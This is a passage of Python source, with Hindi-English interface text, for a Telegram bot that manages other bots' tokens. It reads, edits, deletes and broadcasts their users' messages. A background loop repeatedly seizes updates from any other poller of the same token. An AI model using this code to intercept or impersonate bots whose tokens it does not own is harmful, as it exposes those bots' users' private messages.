            "🔒 <b>PRIVATE BOT</b>\n\nSirf <b>Owner</b> / <b>Admin</b>.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(uid),
        )
        return
    active = context.user_data.get("active_token")
    extra = ""
    if active:
        info = load_data().get("ʙᴏᴛꜱ", {}).get(active, {})
        extra = f"\n\n✅ <b>Active:</b> {info.get('name', 'Selected')}"
    await update.message.reply_text(
        f"🔥 <b>ᴘʀᴇᴍɪᴜᴍ ʙᴏᴛ ᴍᴀɴᴀɢᴇʀ</b> ✨\n\nɴᴇᴇᴄʜᴇ ꜱᴇ ꜰᴇᴀᴛᴜʀᴇ ᴄʜᴜɴᴏ.{extra}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_kb(uid),
    )


async def setup_owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    stored = load_data().get("owner_id", 0)
    if stored:
        if uid == int(stored):
            await update.message.reply_text(f"✅ Tum already owner ho.\nYour ID: <code>{uid}</code>", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("🔒 Owner already set hai.")
        return
    set_owner(uid)
    await update.message.reply_text(
        f"✅ <b>Owner set!</b>\nTumhara ID save ho gaya: <code>{uid}</code>\n\nAb /start karo.",
        parse_mode=ParseMode.HTML
    )

async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Universal BACK — cancel bg + return previous screen."""
    cancel_bg_tasks(context)
    flow = context.user_data.pop("_prev", None)
    if flow == "send":
        await send_menu(update, context)
    elif flow == "view":
        await view_menu(update, context)
    elif flow == "owner":
        await owner_panel(update, context)
    else:
        await back_main(update, context)


async def back_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clear_temp(context)
    active = context.user_data.get("active_token")
    extra = ""
    if active:
        info = load_data().get("ʙᴏᴛꜱ", {}).get(active, {})
        extra = f"\n✅ Active: <b>{info.get('name')}</b>"
    await update.message.reply_text(
        f"🏠 <b>MAIN MENU</b>{extra}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_kb(update.effective_user.id),
    )


# ================== VIEW ==================
async def view_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    context.user_data["_prev"] = "main"
    await update.message.reply_text(
        "📩 <b>VIEW MESSAGES</b>\n\n"
        "ᴍᴀɴᴀɢᴇʀ ʙᴏᴛ ʜɪꜱᴛᴏʀʏ.\n"
        "ʜᴀʀ ᴍᴇꜱꜱᴀɢᴇ ᴘᴇ ᴅᴇʟᴇᴛᴇ / ᴇᴅɪᴛ / ʀᴇᴀᴄᴛ.",
        parse_mode=ParseMode.HTML,
        reply_markup=view_kb(),
    )


async def all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    active = context.user_data.get("active_token")
    if not active:
        await update.message.reply_text(
            "❌ <b>Pehle MY BOTS se bot SELECT karo</b>\n"
            "Phir ALL MESSAGES — selected bot ke last 15 msg.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
        return
    # Sync fetch first — user waits briefly, then sees fresh messages
    load_notif = await update.message.reply_text(
        "🔄 <b>Naye messages fetch ho rahe hain...</b>",
        parse_mode=ParseMode.HTML,
    )
    try:
        await asyncio.wait_for(
            oneshot_fetch_updates(active, max_batches=20, conflict_wait=1.0),
            timeout=30.0,
        )
    except Exception:
        pass
    try:
        await load_notif.delete()
    except Exception:
        pass
    key = token_key(active)
    info = load_data().get("ʙᴏᴛꜱ", {}).get(active, {})
    msgs = load_msgs(key)
    # also merge fallback files for this key
    for folder in (_DATA_DIR, _BASE):
        try:
            fp = folder / f"msgs_{key}.json"
            if fp.exists():
                extra = json.loads(fp.read_text(encoding="utf-8"))
                if isinstance(extra, list):
                    seen = {(m.get("time"), m.get("text"), m.get("user_id"), m.get("direction")) for m in msgs}
                    for m in extra:
                        sig = (m.get("time"), m.get("text"), m.get("user_id"), m.get("direction"))
                        if sig not in seen:
                            msgs.append(m)
                            seen.add(sig)
        except Exception:
            pass
    if not msgs:
        await update.message.reply_text(
            f"📭 <b>Selected bot:</b> {info.get('name')} (@{info.get('username')})\n"
            f"Koi saved message nahi.\n"
            f"SEND se bhejo → yahan aayega.\n"
            f"User reply tab aayega jab updates fetch ho saken.",
            parse_mode=ParseMode.HTML,
            reply_markup=view_kb(),
        )
        return
    last_msgs = msgs[-200:]  # show up to 200 messages
    await update.message.reply_text(
        f"📩 <b>ꜱᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ — ʟᴀꜱᴛ {len(last_msgs)} / ᴛᴏᴛᴀʟ {len(msgs)}</b>\n"
        f"🤖 {info.get('name')} (@{info.get('username')})\n"
        f"ɴᴇᴡᴇꜱᴛ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴀᴛ ᴛʜᴇ ʙᴏᴛᴛᴏᴍ ↓",
        parse_mode=ParseMode.HTML,
    )
    for m in reversed(last_msgs):
        preview = m.get("text") or f"[{m.get('type')}]"
        direction = m.get("direction") or "in"
        arrow = "➡️ OUT" if direction == "out" else "⬅️ IN"
        text = (
            f"{arrow}\n"
            f"👤 <code>{m.get('user_id')}</code> {m.get('name') or ''}\n"
            f"💬 {preview[:3500]}\n"
            f"🕐 {m.get('time')}"
        )
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("🗑️ DELETE", callback_data=f"del|{m.get('chat_id')}|{m.get('message_id')}"),
            InlineKeyboardButton("✍️ EDIT", callback_data=f"edit|{m.get('chat_id')}|{m.get('message_id')}"),
            InlineKeyboardButton("❤️ REACT", callback_data=f"react|{m.get('chat_id')}|{m.get('message_id')}"),
        ]])
        try:
            await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            await update.message.reply_text(text[:3500])
    await update.message.reply_text(
        f"⬆️ ꜱᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ — ʟᴀꜱᴛ {len(last_msgs)} of {len(msgs)} total.\nᴜꜱᴇʀ ᴠɪᴇᴡ ꜱᴇ ᴘᴇʀ-ᴜꜱᴇʀ ᴍᴇꜱꜱᴀɢᴇꜱ ᴅᴇᴋʜᴏ.",
        reply_markup=view_kb(),
    )


async def by_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "👤 <b>USER ID bhejo:</b>\n/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_USER_VIEW


async def by_user_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()
    if "BACK" in _norm(text).upper() or "MAIN" in _norm(text).upper():
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END
    try:
        uid = int(text)
    except Exception:
        await update.message.reply_text("❌ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ")
        return WAIT_USER_VIEW
    active = context.user_data.get("active_token")
    key = token_key(active) if active else "main"

    # Deep search — scan ALL local logs for this user
    all_user_msgs = []
    seen_sigs = set()
    for m in load_msgs(key):
        if int(m.get("user_id") or 0) == uid:
            sig = (m.get("time"), m.get("text"), m.get("direction"))
            if sig not in seen_sigs:
                seen_sigs.add(sig)
                all_user_msgs.append(m)
    # Also scan fallback files
    for folder in (_DATA_DIR, _BASE):
        try:
            fp = folder / f"msgs_{key}.json"
            if fp.exists():
                raw = json.loads(fp.read_text(encoding="utf-8"))
                for m in (raw if isinstance(raw, list) else []):
                    if int(m.get("user_id") or 0) == uid:
                        sig = (m.get("time"), m.get("text"), m.get("direction"))
                        if sig not in seen_sigs:
                            seen_sigs.add(sig)
                            all_user_msgs.append(m)
        except Exception:
            pass

    msgs = all_user_msgs
    if not msgs:
        await update.message.reply_text(
            f"📭 ᴜꜱᴇʀ {uid} ke messages nahi mile.\n"
            f"Pehle user se message bhejo ya user ko bot pe message karne do.",
            reply_markup=view_kb())
        return ConversationHandler.END

    _TYPE_ICON = {
        "photo": "📸", "video": "🎬", "document": "📎",
        "voice": "🎤", "audio": "🎵", "sticker": "🎭",
    }
    for m in reversed(msgs[-200:]):
        direction = m.get("direction") or "in"
        arrow = "📤 SENT" if direction == "out" else "📥 RECEIVED"
        mtype = m.get("type", "text")
        icon = _TYPE_ICON.get(mtype, "💬")
        preview = m.get("text") or f"[{icon} {mtype.upper()}]"
        body = (
            f"{arrow}\n"
            f"👤 <b>{m.get('name') or m.get('user_id')}</b>  <code>{m.get('user_id')}</code>\n"
            f"{icon} {preview[:3200]}\n"
            f"🕐 {m.get('time')}"
        )
        try:
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton("🗑️ DEL", callback_data=f"del|{m.get('chat_id')}|{m.get('message_id')}"),
                InlineKeyboardButton("✍️ EDIT", callback_data=f"edit|{m.get('chat_id')}|{m.get('message_id')}"),
                InlineKeyboardButton("❤️ REACT", callback_data=f"react|{m.get('chat_id')}|{m.get('message_id')}"),
            ]])
            await update.message.reply_text(body, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            await update.message.reply_text(body[:3800])
    await update.message.reply_text(
        f"⬆️ {len(msgs)} messages | 📤=Sent by manager  📥=Received from user",
        reply_markup=view_kb(),
    )
    return ConversationHandler.END


# ================== CALLBACK ==================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    parts = data.split("|")
    action = parts[0]
    # Prefer SELECTED bot for actions on its messages
    bot = context.bot
    token = context.user_data.get("active_token")
    _extra_bot = None
    if token:
        try:
            _extra_bot = Bot(token=token)
            await _extra_bot.initialize()
            bot = _extra_bot
        except Exception:
            bot = context.bot

    if action == "del" and len(parts) == 3:
        chat_id, msg_id = parts[1], int(parts[2])
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
            await query.edit_message_text("✅ <b>DELETED</b>", parse_mode=ParseMode.HTML)
        except Exception as e:
            # fallback main bot
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                await query.edit_message_text("✅ <b>DELETED</b>", parse_mode=ParseMode.HTML)
            except Exception as e2:
                await query.edit_message_text(f"❌ {e2}")
        finally:
            if _extra_bot:
                try: await _extra_bot.shutdown()
                except Exception: pass

    elif action == "react" and len(parts) == 3:
        chat_id, msg_id = parts[1], int(parts[2])
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("👍", callback_data=f"do_react|{chat_id}|{msg_id}|👍"),
                InlineKeyboardButton("❤️", callback_data=f"do_react|{chat_id}|{msg_id}|❤️"),
                InlineKeyboardButton("🔥", callback_data=f"do_react|{chat_id}|{msg_id}|🔥"),
                InlineKeyboardButton("😂", callback_data=f"do_react|{chat_id}|{msg_id}|😂"),
            ],
            [
                InlineKeyboardButton("😮", callback_data=f"do_react|{chat_id}|{msg_id}|😮"),
                InlineKeyboardButton("😢", callback_data=f"do_react|{chat_id}|{msg_id}|😢"),
                InlineKeyboardButton("👎", callback_data=f"do_react|{chat_id}|{msg_id}|👎"),
            ],
        ])
        await query.edit_message_reply_markup(reply_markup=kb)

    elif action == "do_react" and len(parts) == 4:
        chat_id, msg_id, emoji = parts[1], int(parts[2]), parts[3]
        try:
            # PTB version-safe reaction: try class first, fall back to raw dict
            try:
                from telegram import ReactionTypeEmoji as _RTE
                reaction_obj = [_RTE(emoji=emoji)]
            except ImportError:
                reaction_obj = [{"type": "emoji", "emoji": emoji}]
            await bot.set_message_reaction(
                chat_id=chat_id,
                message_id=msg_id,
                reaction=reaction_obj,
            )
            await query.edit_message_text(f"✅ Reaction {emoji} set")
        except Exception as e:
            try:
                try:
                    from telegram import ReactionTypeEmoji as _RTE
                    reaction_obj2 = [_RTE(emoji=emoji)]
                except ImportError:
                    reaction_obj2 = [{"type": "emoji", "emoji": emoji}]
                await context.bot.set_message_reaction(
                    chat_id=chat_id, message_id=msg_id,
                    reaction=reaction_obj2,
                )
                await query.edit_message_text(f"✅ Reaction {emoji} set")
            except Exception as e2:
                await query.edit_message_text(
                    f"❌ React fail: {e2}\n"
                    f"(Selected bot message pe react usi bot token se hota hai)"
                )
        finally:
            if _extra_bot:
                try: await _extra_bot.shutdown()
                except Exception: pass

    elif action == "edit" and len(parts) == 3:
        chat_id, msg_id = parts[1], int(parts[2])
        context.user_data["edit_chat"] = chat_id
        context.user_data["edit_msg"] = msg_id
        context.user_data["waiting_edit"] = True
        await query.edit_message_text("✍️ <b>Naya text bhejo:</b>\n/cancel", parse_mode=ParseMode.HTML)

    elif action == "pick_uid" and len(parts) == 2:
        # select user from list
        try:
            uid = int(parts[1])
        except Exception:
            return
        context.user_data["selected_uid"] = uid
        cancel_bg_tasks(context)
        await query.edit_message_text(
            f"✅ <b>Selected User:</b> <code>{uid}</code>\n\n"
            f"Neeche se <b>VIEW USER MSGS</b> ya <b>SEND TO THIS USER</b>.",
            parse_mode=ParseMode.HTML,
        )
        await context.bot.send_message(
            query.message.chat_id,
            f"👤 Active user: <code>{uid}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=user_action_kb(),
        )


async def handle_edit_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("waiting_edit"):
        return
    text = (update.message.text or "").strip()
    if text.startswith("/") or any(x in _norm(text).upper() for x in ["VIEW", "SEND", "MAIN", "OWNER", "BACK"]):
        context.user_data.pop("waiting_edit", None)
        return
    chat_id = context.user_data.get("edit_chat")
    msg_id = context.user_data.get("edit_msg")
    if not chat_id or not msg_id:
        await update.message.reply_text("❌ Session expired")
        context.user_data.pop("waiting_edit", None)
        return
    edit_bot = context.bot
    token = context.user_data.get("active_token")
    _eb = None
    if token:
        try:
            _eb = Bot(token=token)
            await _eb.initialize()
            edit_bot = _eb
        except Exception:
            pass
    try:
        await edit_bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
        await update.message.reply_text(
            "✅ <b>EDITED</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=main_kb(update.effective_user.id))
    finally:
        if _eb:
            try: await _eb.shutdown()
            except Exception: pass
    context.user_data.pop("waiting_edit", None)
    context.user_data.pop("edit_chat", None)
    context.user_data.pop("edit_msg", None)


# ================== ᴀʟʟ ᴜꜱᴇʀꜱ ==================
async def all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    msgs = load_msgs()
    data = load_data()
    users = {}
    for m in msgs:
        uid = m.get("user_id")
        if uid and uid not in users:
            users[uid] = {
                "name": m.get("name", "Unknown"),
                "username": m.get("username", ""),
            }
    for uid in data.get("saved_uids", []):
        users.setdefault(uid, {"name": str(uid), "username": ""})
    if not users:
        await update.message.reply_text(
            "📭 <b>Koi user nahi</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
        return
    text = f"👥 <b>ᴀʟʟ ᴜꜱᴇʀꜱ</b> ({len(users)})\n\n"
    for uid, info in list(users.items())[:40]:
        uname = f"@{info['username']}" if info["username"] else "—"
        text += f"<b>{info['name']}</b>\nID: <code>{uid}</code> | {uname}\n\n"
    if len(users) > 40:
        text += f"... +{len(users)-40} more"
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML, reply_markup=main_kb(update.effective_user.id)
    )


# ================== SEND MENU ==================
async def send_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    context.user_data["_prev"] = "main"
    active = context.user_data.get("active_token")
    note = ""
    if active:
        info = load_data().get("ʙᴏᴛꜱ", {}).get(active, {})
        note = f"\n\n✅ ꜱᴇɴᴅᴇʀ: <b>{info.get('name')}</b>"
    await update.message.reply_text(
        f"📤 <b>SEND MESSAGE</b>\n\n"
        f"• ꜱᴇɴᴅ ʙᴏᴛ ᴍᴇꜱꜱᴀɢᴇ\n"
        f"• ꜱᴇɴᴅ ᴛᴏ ᴜꜱᴇʀ ɪᴅ\n"
        f"• ᴀᴅᴅ ᴜꜱᴇʀ\n"
        f"• ᴜꜱᴇʀ ʟɪꜱᴛ (ꜱᴇʟᴇᴄᴛ → ᴠɪᴇᴡ / ꜱᴇɴᴅ){note}",
        parse_mode=ParseMode.HTML,
        reply_markup=send_kb(),
    )


# ── ADD USER ──
async def multi_uid_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    context.user_data["_prev"] = "send"
    await update.message.reply_text(
        "➕ <b>ADD USER</b>\n\n"
        "ᴜꜱᴇʀ ɪᴅ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ.\n"
        "ᴀᴅᴅ ʜᴏᴛᴇ ʜɪ ꜱᴀᴠᴇ ʜᴏ ᴊᴀʏᴇɢᴀ.\n"
        "ᴀᴜʀ ɪᴅꜱ ʙʜᴇᴊ ꜱᴀᴋᴛᴇ ʜᴏ (ᴜɴʟɪᴍɪᴛᴇᴅ).\n"
        "/cancel ya BACK",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_MULTI_UID


async def multi_uid_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()
    t = _norm(text).upper()
    if "BACK" in t or "MAIN" in t or "SEND MESSAGE" in t or "VIEW" in t:
        clear_temp(context)
        if "SEND MESSAGE" in t:
            await send_menu(update, context)
        else:
            await back_main(update, context)
        return ConversationHandler.END
    # extract digits only
    digits = "".join(ch for ch in text if ch.isdigit() or ch == "-")
    try:
        uid = int(digits)
    except Exception:
        await update.message.reply_text(
            "❌ <b>Valid User ID number bhejo</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_main_kb(),
        )
        return WAIT_MULTI_UID
    data = load_data()
    saved = data.setdefault("saved_uids", [])
    if uid not in saved:
        saved.append(uid)
        save_data(data)
        msg = f"✅ <b>SUCCESS</b>\n\nUser <code>{uid}</code> add ho gaya!"
    else:
        msg = f"ℹ️ <code>{uid}</code> pehle se list me hai."
    await update.message.reply_text(
        msg + "\n\nAur ID bhejo ya BACK.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_MULTI_UID



async def user_list_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    context.user_data["_prev"] = "send"
    msgs_main = load_msgs("main")
    active = context.user_data.get("active_token")
    msgs_bot = load_msgs(token_key(active)) if active else []
    data = load_data()
    users = {}
    for m in msgs_main + msgs_bot:
        uid = m.get("user_id")
        if uid and not is_admin(uid):
            users[uid] = m.get("name") or str(uid)
    for uid in data.get("saved_uids", []):
        users.setdefault(uid, str(uid))
    if not users:
        await update.message.reply_text(
            "📭 <b>ᴜꜱᴇʀ ʟɪꜱᴛ ᴇᴍᴘᴛʏ</b>\nᴀᴅᴅ ᴜꜱᴇʀ ꜱᴇ ɪᴅ ᴀᴅᴅ ᴋᴀʀᴏ.",
            parse_mode=ParseMode.HTML,
            reply_markup=send_kb(),
        )
        return
    kb = []
    row = []
    for uid, name in list(users.items())[:40]:
        row.append(btn(f"USER {uid}", "primary"))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([btn("🔙 BACK", "danger"), btn("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", "primary")])
    await update.message.reply_text(
        f"📇 <b>ᴜꜱᴇʀ ʟɪꜱᴛ</b> ({len(users)})\n\n"
        f"ɴᴇᴇᴄʜᴇ ᴜꜱᴇʀ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ → ᴠɪᴇᴡ / ꜱᴇɴᴅ",
        parse_mode=ParseMode.HTML,
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True),
    )



async def view_user_msgs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    cancel_bg_tasks(context)
    uid = context.user_data.get("selected_uid")
    if not uid:
        await update.message.reply_text(
            "❌ Pehle ᴜꜱᴇʀ ʟɪꜱᴛ se user select karo",
            reply_markup=send_kb(),
        )
        return
    active = context.user_data.get("active_token")
    key = token_key(active) if active else "main"

    def _collect():
        msgs = []
        seen = set()
        # Primary log for selected bot key only
        for m in load_msgs(key):
            try:
                if int(m.get("user_id") or 0) != int(uid):
                    continue
            except Exception:
                continue
            sig = (m.get("time"), m.get("text"), m.get("direction"), m.get("message_id"))
            if sig in seen:
                continue
            seen.add(sig)
            msgs.append(m)
        # Fallback file for THIS bot key only (not glob of all ʙᴏᴛꜱ)
        for folder in (_DATA_DIR, _BASE):
            try:
                fp = folder / f"msgs_{key}.json"
                if not fp.exists():
                    continue
                try:
                    extra = json.loads(fp.read_text(encoding="utf-8"))
                except Exception:
                    continue
                if not isinstance(extra, list):
                    continue
                for m in extra:
                    try:
                        if int(m.get("user_id") or 0) != int(uid):
                            continue
                    except Exception:
                        continue
                    sig = (m.get("time"), m.get("text"), m.get("direction"), m.get("message_id"))
                    if sig in seen:
                        continue
                    seen.add(sig)
                    msgs.append(m)
            except Exception:
                pass
        return msgs

    msgs = _collect()
    total = len(msgs)
    if msgs:
        lines = []
        for m in msgs[-200:]:
            d = "📤" if m.get("direction") == "out" else "📥"
            txt = (m.get("text") or f"[{m.get('type', '?')}]")[:300]
            lines.append(f"{d} [{m.get('time')}] {txt}")
        preview = "\n".join(lines)
    else:
        preview = "📭 Abhi koi message nahi\nSend karo → 📤 dikhega"

    sent = await update.message.reply_text(
        f"👁 <b>LIVE VIEW</b> user <code>{uid}</code>\n"
        f"Last 200 / Total <b>{total}</b> | 📤=Sent  📥=Received\n"
        f"⚠️ ᴜꜱᴇʀ ʀᴇᴘʟɪᴇꜱ ꜱɪʀꜰ ᴛᴀʙʜɪ ᴅɪᴋʜᴛᴇ ʜᴀɪɴ ᴊᴀʙ ʙᴏᴛ ꜱɪʀꜰ ɪꜱɪ ᴍᴀɴᴀɢᴇʀ ꜱᴇ ᴄʜᴀʟ ʀᴀʜᴀ ʜᴏ\n\n"
        f"<pre>{preview[:3800]}</pre>\n\n"
        f"ʙᴀᴄᴋ ꜱᴇ ꜱᴛᴏᴘ.",
        parse_mode=ParseMode.HTML,
        reply_markup=user_action_kb(),
    )
    context.user_data["_refresh_msg_id"] = sent.message_id
    context.user_data["_refresh_chat"] = sent.chat_id
    context.user_data["_refresh_uid"] = uid
    context.user_data["_refresh_key"] = key
    context.user_data["_refresh_token"] = active

    async def _bg():
        """Continuous background fetch — keeps kicking other poller every cycle."""
        if not active:
            return
        while True:
            try:
                await oneshot_fetch_updates(active, max_batches=20, conflict_wait=1.0)
            except asyncio.CancelledError:
                return
            except Exception:
                pass
            await asyncio.sleep(0.3)

    try:
        bg_task = context.application.create_task(_bg())
        context.user_data["_bg_task"] = bg_task
    except Exception:
        pass

    async def _loop2(app, chat_id, msg_id, target_uid, token):
        last = ""
        ticks = 0
        try:
            while True:
                await asyncio.sleep(1.0)
                ticks += 1
                # Quick 3-attempt fast check (conflict_wait=0.1 = non-blocking)
                # Heavy lifting is done by _bg() above
                if token:
                    try:
                        await oneshot_fetch_updates(token, max_batches=5, conflict_wait=0.5)
                    except Exception:
                        pass
                msgs = _collect()
                if msgs:
                    lines = []
                    for m in msgs[-200:]:
                        d = "📤" if m.get("direction") == "out" else "📥"
                        txt = (m.get("text") or f"[{m.get('type', '?')}]")[:300]
                        lines.append(f"{d} [{m.get('time')}] {txt}")
                    body = "\n".join(lines)
                    hdr = f"Last 200 / Total <b>{len(msgs)}</b> | 📤=Sent 📥=Received"
                else:
                    body = "📭 Abhi koi message nahi"
                    hdr = "ᴀᴜᴛᴏ ʀᴇꜰʀᴇꜱʜ 1ꜱ"
                if body == last:
                    continue
                last = body
                try:
                    await app.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=msg_id,
                        text=(
                            f"👁 <b>LIVE VIEW</b> user <code>{target_uid}</code>\n"
                            f"{hdr}\n\n"
                            f"<pre>{body[:3800]}</pre>\n\n"
                            f"ʙᴀᴄᴋ ꜱᴇ ꜱᴛᴏᴘ."
                        ),
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass
        except asyncio.CancelledError:
            return

    task = asyncio.create_task(
        _loop2(context.application, sent.chat_id, sent.message_id, uid, active)
    )
    context.user_data["_refresh_task"] = task


async def send_to_selected_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    uid = context.user_data.get("selected_uid")
    if not uid:
        await update.message.reply_text("❌ Pehle user select karo", reply_markup=send_kb())
        return ConversationHandler.END
    await update.message.reply_text(
        f"✉️ <b>ꜱᴇɴᴅ ᴛᴏ</b> <code>{uid}</code>\nᴍᴇꜱꜱᴀɢᴇ / ᴘʜᴏᴛᴏ / ᴠɪᴅᴇᴏ ʙʜᴇᴊᴏ:\n/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_PICK_USER_SEND


async def send_to_selected_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "")[:40].upper()
    if any(x in text for x in ["BACK", "MAIN", "VIEW", "SEND"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END
    uid = context.user_data.get("selected_uid")
    bot = context.bot
    token = context.user_data.get("active_token")
    if token:
        try:
            bot = Bot(token=token)
            await bot.initialize()
        except Exception:
            bot = context.bot
    try:
        sent_txt = (update.message.text or update.message.caption or "[media]")[:4000]
        if update.message.text:
            await bot.send_message(chat_id=uid, text=update.message.text)
        else:
            # Download via manager bot, re-upload via selected bot (cross-bot file_id fix)
            media_res = await _dl_media(context, update.message)
            await _send_media_to(bot, uid, media_res)
        if token:
            try:
                log_outbound(token, int(uid), sent_txt)
            except Exception:
                pass
        await update.message.reply_text(
            f"✅ ꜱᴇɴᴛ ᴛᴏ <code>{uid}</code> — ꜱᴀᴠᴇᴅ ᴛᴏ ᴠɪᴇᴡ",
            parse_mode=ParseMode.HTML,
            reply_markup=user_action_kb(),
        )
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=user_action_kb())
    finally:
        if token and bot != context.bot:
            try:
                await bot.shutdown()
            except Exception:
                pass
    return ConversationHandler.END


async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    cancel_bg_tasks(context)
    active = context.user_data.get("active_token")
    if not active:
        await update.message.reply_text(
            "❌ <b>Pehle MY BOTS se bot select karo</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
        return ConversationHandler.END

    # ── Aggressive pre-fetch: grab all available users before counting ──
    await update.message.reply_text(
        "⏳ <b>ᴜꜱᴇʀꜱ ꜰᴇᴛᴄʜ ʜᴏ ʀᴀʜᴇ ʜᴀɪɴ ꜱᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ ꜱᴇ...</b>",
        parse_mode=ParseMode.HTML,
    )
    try:
        fetched = await asyncio.wait_for(
            oneshot_fetch_updates(active, max_batches=30, conflict_wait=1.0),
            timeout=60.0,
        )
    except Exception:
        fetched = 0

    users = get_broadcast_targets(active)
    info = load_data().get("ʙᴏᴛꜱ", {}).get(active, {})
    fetch_note = f"\n🔄 ꜰʀᴇꜱʜ ꜰᴇᴛᴄʜ: <b>{fetched if fetched >= 0 else '⚠️ 409 blocked'}</b> new msgs saved" if fetched else ""
    await update.message.reply_text(
        f"📢 <b>BROADCAST</b>\n\n"
        f"✅ ꜱᴇɴᴅᴇʀ: <b>{info.get('name')}</b>\n"
        f"👥 ᴋɴᴏᴡɴ ᴛᴀʀɢᴇᴛꜱ: <b>{len(users)}</b>{fetch_note}\n\n"
        f"ℹ️ ᴀɢᴀʀ ᴜꜱᴇʀꜱ ᴋᴀᴍ ᴅɪᴋʜ ʀᴀʜᴇ ʜᴀɪɴ:\n"
        f"→ ꜱᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ ᴘᴇ ᴜꜱᴇʀꜱ /start ᴋᴀʀᴇɪɴ\n"
        f"→ ʏᴀ ᴀᴅᴅ ᴜꜱᴇʀ ꜱᴇ ᴍᴀɴᴜᴀʟʟʏ ɪᴅꜱ ᴅᴀᴀʟᴏ\n\n"
        f"ᴍᴇꜱꜱᴀɢᴇ / ᴘʜᴏᴛᴏ / ᴠɪᴅᴇᴏ ʙʜᴇᴊᴏ.\n/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_BROADCAST


async def broadcast_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = _norm(update.message.text or "").upper()[:60]
    if any(x in text for x in ["VIEW", "SEND", "MAIN", "OWNER", "BACK"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END
    active = context.user_data.get("active_token")
    if not active:
        await update.message.reply_text("❌ ʙᴏᴛ ꜱᴇʟᴇᴄᴛ ɴᴀʜɪ", reply_markup=main_kb(update.effective_user.id))
        return ConversationHandler.END
    users = get_broadcast_targets(active)
    if not users:
        await update.message.reply_text(
            "📭 ᴋᴏɪ ᴜꜱᴇʀ ɴᴀʜɪ ᴍɪʟᴀ\n"
            "→ ꜱᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ ᴘᴇ /start ᴋᴀʀᴇɪɴ\n"
